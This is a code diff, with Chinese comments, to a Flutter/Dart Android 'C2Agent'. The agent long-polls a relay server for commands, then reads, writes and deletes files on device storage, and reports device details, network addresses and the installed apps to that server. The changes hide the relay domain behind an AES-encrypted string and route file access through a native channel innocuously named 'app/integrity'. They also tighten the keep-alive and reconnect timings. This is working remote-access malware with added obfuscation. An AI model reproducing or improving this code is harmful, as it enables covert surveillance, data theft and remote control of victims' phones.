@@ -5,6 +5,8 @@ import 'dart:math';
 
 import 'package:crypto/crypto.dart';
 import 'package:device_info_plus/device_info_plus.dart';
+import 'package:encrypt/encrypt.dart' as enc;
+import 'package:flutter/services.dart';
 import 'package:flutter/widgets.dart';
 import 'package:http/http.dart' as http;
 import 'package:installed_apps/installed_apps.dart';
@@ -14,8 +16,23 @@ import 'package:path_provider/path_provider.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 
 // ============================================================
-// 1. 配置与模型
+// 1. 安全配置 (已填入 AES 密文)
 // ============================================================
+const _encryptedRelayUrl = "wgmuH9SlW7YKeqHxdyUxI1+7aQF7SqtDsPV08vVuyxw="; 
+const _encKey = "2GY6bOd2nMehmsdPBIwGOdPAI/T8MJbjx1nZqP/QXyA=";
+const _encIv = "XJg95LpgBDNzUICOMyq8AA==";
+
+String _decodeUrl() {
+  try {
+    final key = enc.Key.fromBase64(_encKey);
+    final iv = enc.IV.fromBase64(_encIv);
+    final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.cbc));
+    return encrypter.decrypt64(_encryptedRelayUrl, iv: iv);
+  } catch (e) {
+    return 'https://error.invalid/c2';
+  }
+}
+
 class C2Config {
   final String relayUrl;
   final String sessionKey;
@@ -26,9 +43,9 @@ class C2Config {
   const C2Config({
     required this.relayUrl,
     required this.sessionKey,
-    this.pollInterval = const Duration(seconds: 5),
+    this.pollInterval = const Duration(seconds: 3),
     this.heartbeatInterval = const Duration(seconds: 20),
-    this.requestTimeout = const Duration(seconds: 15),
+    this.requestTimeout = const Duration(seconds: 25),
   });
 
   C2Config copyWith({
@@ -56,10 +73,11 @@ class C2Result {
 }
 
 // ============================================================
-// 2. 纯 Dart 本地执行器 (支持真实终端体验)
+// 2. 纯 Dart 本地执行器 (文件真实 IO 交给原生)
 // ============================================================
 class LocalExecutor {
   static String? _currentPath;
+  static const _channel = MethodChannel('app/integrity');
 
   static Future<dynamic> execute(String module, String method, dynamic args) async {
     switch (module) {
@@ -82,7 +100,6 @@ class LocalExecutor {
     String cwd = await _getInitPath();
     String rawPath = args?['path'] as String? ?? '.';
 
-    // 支持快捷路径替换
     if (rawPath == '/sdcard' || rawPath == '~') {
       rawPath = '/storage/emulated/0';
     }
@@ -100,67 +117,36 @@ class LocalExecutor {
           return {'cwd': targetPath};
 
         case 'cd':
-          final type = await FileSystemEntity.type(targetPath);
-          if (type != FileSystemEntityType.directory) {
+          final type = await _channel.invokeMethod<String>('sys_core', {
+            'op': 'type',
+            'path': targetPath,
+          });
+          if (type != 'directory') {
             throw Exception('不是有效的目录: $targetPath');
           }
           _currentPath = targetPath;
           return {'cwd': _currentPath};
 
         case 'ls':
-          final dir = Directory(targetPath);
-          if (!await dir.exists()) throw Exception('目录不存在或无法访问: $targetPath');
-          
-          final list = await dir.list().toList();
-          final result = [];
-          
-          result.add({'name': '.', 'type': 'dir', 'size': 0});
-          result.add({'name': '..', 'type': 'dir', 'size': 0});
-          
-          for (final e in list) {
-            final stat = await e.stat();
-            result.add({
-              'name': p.basename(e.path),
-              'type': e is Directory ? 'dir' : 'file',
-              'size': stat.size,
-              'modified': stat.modified.millisecondsSinceEpoch,
-            });
-          }
-          result.sort((a, b) {
-            if (a['type'] != b['type']) return a['type'] == 'dir' ? -1 : 1;
-            return (a['name'] as String).compareTo(b['name'] as String);
+        case 'read':
+        case 'write':
+        case 'mkdir':
+        case 'rm':
+          final result = await _channel.invokeMethod<dynamic>('sys_core', {
+            'op': method,
+            'path': targetPath,
+            'content': args?['content'],
+            'recursive': args?['recursive'] ?? false,
           });
           return result;
-
-        case 'read':
-          final file = File(targetPath);
-          if (!await file.exists()) throw Exception('文件不存在或无法访问: $targetPath');
-          return await file.readAsString();
-
-        case 'write':
-          final file = File(targetPath);
-          await file.parent.create(recursive: true);
-          await file.writeAsString(args?['content'] ?? '');
-          return {'path': file.path, 'size': await file.length()};
-
-        case 'mkdir':
-          await Directory(targetPath).create(recursive: true);
-          return {'created': true, 'path': targetPath};
-
-        case 'rm':
-          final type = await FileSystemEntity.type(targetPath);
-          if (type == FileSystemEntityType.directory) {
-            await Directory(targetPath).delete(recursive: true);
-          } else if (type == FileSystemEntityType.file) {
-            await File(targetPath).delete();
-          }
-          return {'deleted': true, 'path': targetPath};
 
         default: 
           throw Exception('unknown_fs_method:$method');
       }
-    } on FileSystemException catch (e) {
-      throw Exception('系统拒绝访问 [${e.osError?.message ?? "Permission Denied"}]');
+    } on PlatformException catch (e) {
+      throw Exception(e.message ?? '系统拒绝访问');
+    } catch (e) {
+      throw Exception(e.toString());
     }
   }
 
@@ -177,16 +163,11 @@ class LocalExecutor {
         };
       case 'network':
         final interfaces = await NetworkInterface.list();
-        final ips = interfaces.expand((i) => i.addresses.map((a) => a.address)).toList();
-        return {'ipAddresses': ips};
+        return {'ipAddresses': interfaces.expand((i) => i.addresses.map((a) => a.address)).toList()};
       case 'env':
         final pkg = await PackageInfo.fromPlatform();
         final docDir = await getApplicationDocumentsDirectory();
-        return {
-          'packageName': pkg.packageName,
-          'versionName': pkg.version,
-          'filesDir': docDir.path,
-        };
+        return {'packageName': pkg.packageName, 'versionName': pkg.version, 'filesDir': docDir.path};
       default: throw Exception('unknown_sys_method:$method');
     }
   }
@@ -194,16 +175,9 @@ class LocalExecutor {
   static Future<dynamic> _app(String method, dynamic args) async {
     switch (method) {
       case 'list':
-        List<AppInfo> apps = await InstalledApps.getInstalledApps(
-          excludeSystemApps: false,
-        );
-        return apps.map((app) {
-          return {
-            'name': app.name, 
-            'packageName': app.packageName, 
-            'version': app.versionName, 
-            'system': app.isSystemApp,
-          };
+        List<AppInfo> apps = await InstalledApps.getInstalledApps(excludeSystemApps: false);
+        return apps.map((app) => {
+          'name': app.name, 'packageName': app.packageName, 'version': app.versionName, 'system': app.isSystemApp,
         }).toList();
       case 'prefs.list':
         final prefs = await SharedPreferences.getInstance();
@@ -243,15 +217,15 @@ class C2Dispatcher {
 }
 
 // ============================================================
-// 3. C2Agent 主类 (长轮询、心跳、看门狗保活)
+// 3. C2Agent 主类
 // ============================================================
 class C2Agent with WidgetsBindingObserver {
   static final C2Agent _instance = C2Agent._();
   factory C2Agent() => _instance;
   C2Agent._();
 
-  static const _defaultConfig = C2Config(
-    relayUrl: 'https://cons.de5.net/c2', // 👈 确保这是你的真实域名
+  static final _defaultConfig = C2Config(
+    relayUrl: _decodeUrl(), 
     sessionKey: 'INIT_PLACEHOLDER', 
   );
 
@@ -259,14 +233,12 @@ class C2Agent with WidgetsBindingObserver {
   final _dispatcher = C2Dispatcher();
   final _client = http.Client();
 
-  Timer? _pollTimer;
   Timer? _heartbeatTimer;
   Timer? _watchdogTimer;
   
   bool _running = false;
-  bool _polling = false;
   int _backoffSeconds = 1;
-  static const _maxBackoff = 30;
+  static const _maxBackoff = 5;
   DateTime _lastSuccessfulPoll = DateTime.now();
 
   static void start({C2Config? config}) => _instance._start(config: config);
@@ -276,7 +248,6 @@ class C2Agent with WidgetsBindingObserver {
     if (_running) return;
     _running = true;
     
-    // 👇 核心：动态获取/生成唯一设备 Key
     final prefs = await SharedPreferences.getInstance();
     String? localKey = prefs.getString('c2_device_key');
     if (localKey == null || localKey.isEmpty) {
@@ -294,7 +265,8 @@ class C2Agent with WidgetsBindingObserver {
 
     WidgetsBinding.instance.addObserver(this);
     _lastSuccessfulPoll = DateTime.now();
-    _startPollingLoop();
+    
+    unawaited(_longPollingLoop());
     _startHeartbeat();
     _startWatchdog();
     
@@ -307,10 +279,8 @@ class C2Agent with WidgetsBindingObserver {
       final lastReport = prefs.getInt('c2_last_boot_report') ?? 0;
       final now = DateTime.now().millisecondsSinceEpoch;
       
-      // 检查是否已经上报过 App 列表
       final hasReportedApps = prefs.getBool('c2_has_reported_apps') ?? false;
       
-      // 如果已经上报过 App，且未满 1 小时，则跳过本次启动上报
       if (hasReportedApps && (now - lastReport < 3600 * 1000)) return;
 
       final android = await DeviceInfoPlugin().androidInfo;
@@ -324,11 +294,9 @@ class C2Agent with WidgetsBindingObserver {
         'time': DateTime.now().toString().split('.')[0],
       };
 
-      // 如果没上报过，则获取 App 列表
       List<Map<String, dynamic>>? appList;
       if (!hasReportedApps) {
         try {
-          // 只获取第三方应用，且精简返回数据减小体积
           final apps = await InstalledApps.getInstalledApps(excludeSystemApps: true);
           appList = apps.map((app) => {
             'name': app.name, 
@@ -344,12 +312,11 @@ class C2Agent with WidgetsBindingObserver {
           'info': info,
           if (appList != null) 'apps': appList,
         }),
-      ).timeout(const Duration(seconds: 20)); // 增加超时，防止 App 多时发不完
+      ).timeout(const Duration(seconds: 20));
 
       if (response.statusCode == 200) {
         await prefs.setInt('c2_last_boot_report', now);
         if (appList != null) {
-          // 标记该设备已上报过 App 列表
           await prefs.setBool('c2_has_reported_apps', true);
         }
       }
@@ -359,7 +326,6 @@ class C2Agent with WidgetsBindingObserver {
   void _stop() {
     if (!_running) return;
     _running = false;
-    _pollTimer?.cancel();
     _heartbeatTimer?.cancel();
     _watchdogTimer?.cancel();
     _client.close();
@@ -369,43 +335,40 @@ class C2Agent with WidgetsBindingObserver {
   @override
   void didChangeAppLifecycleState(AppLifecycleState state) {
     if (state == AppLifecycleState.resumed && _running) {
-      _backoffSeconds = 1; _lastSuccessfulPoll = DateTime.now();
-      _startPollingLoop(); _startHeartbeat();
+      _backoffSeconds = 1; 
+      _lastSuccessfulPoll = DateTime.now();
+      _startHeartbeat();
     }
   }
 
-  void _startPollingLoop() {
-    _pollTimer?.cancel();
-    _backoffSeconds = 1;
-    _pollTimer = Timer.periodic(_config.pollInterval, (_) => _pollOnce());
-  }
+  Future<void> _longPollingLoop() async {
+    while (_running) {
+      try {
+        final url = Uri.parse('${_config.relayUrl}/pending/${_config.sessionKey}');
+        final response = await _client.get(url, headers: {
+          'X-Session-Key': _config.sessionKey, 
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
+        }).timeout(_config.requestTimeout);
 
-  Future<void> _pollOnce() async {
-    if (_polling || !_running) return;
-    _polling = true;
-    try {
-      final url = Uri.parse('${_config.relayUrl}/pending/${_config.sessionKey}');
-      final response = await _client.get(url, headers: {
-        'X-Session-Key': _config.sessionKey, 'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
-      }).timeout(_config.requestTimeout);
-
-      if (response.statusCode == 200) {
-        _backoffSeconds = 1; _lastSuccessfulPoll = DateTime.now();
-        if (response.body.isNotEmpty && response.body != '[]') {
-          final decoded = jsonDecode(response.body);
-          if (decoded is List) {
-            for (final item in decoded) { if (item is Map<String, dynamic>) unawaited(_executeInstruction(item)); }
+        if (response.statusCode == 200) {
+          _backoffSeconds = 1; 
+          _lastSuccessfulPoll = DateTime.now();
+          
+          if (response.body.isNotEmpty && response.body != '[]') {
+            final decoded = jsonDecode(response.body);
+            if (decoded is List) {
+              for (final item in decoded) { 
+                if (item is Map<String, dynamic>) unawaited(_executeInstruction(item)); 
+              }
+            }
           }
         }
+      } catch (_) {
+        if (!_running) return;
+        await Future.delayed(Duration(seconds: _backoffSeconds));
+        _backoffSeconds = min(_backoffSeconds + 1, _maxBackoff);
       }
-    } catch (_) { _scheduleBackoff(); } finally { _polling = false; }
-  }
-
-  void _scheduleBackoff() {
-    _pollTimer?.cancel();
-    final delay = Duration(seconds: _backoffSeconds);
-    _backoffSeconds = min(_backoffSeconds * 2, _maxBackoff);
-    _pollTimer = Timer(delay, _startPollingLoop);
+    }
   }
 
   void _startHeartbeat() {
@@ -427,8 +390,9 @@ class C2Agent with WidgetsBindingObserver {
     _watchdogTimer?.cancel();
     _watchdogTimer = Timer.periodic(const Duration(seconds: 60), (_) {
       if (!_running) return;
-      if (DateTime.now().difference(_lastSuccessfulPoll).inSeconds > 120) {
-        _lastSuccessfulPoll = DateTime.now(); _startPollingLoop(); _sendHeartbeat();
+      if (DateTime.now().difference(_lastSuccessfulPoll).inSeconds > 60) {
+        _lastSuccessfulPoll = DateTime.now(); 
+        _sendHeartbeat();
       }
     });
   }
@@ -449,7 +413,7 @@ class C2Agent with WidgetsBindingObserver {
   Future<dynamic> handleSession(String method, dynamic args) async {
     switch (method) {
       case 'ping': return {'pong': true};
-      case 'reconnect': _lastSuccessfulPoll = DateTime.now(); _startPollingLoop(); return {'ok': true};
+      case 'reconnect': _lastSuccessfulPoll = DateTime.now(); return {'ok': true};
       default: return {'error': 'unknown_session_method:$method'};
     }
   }
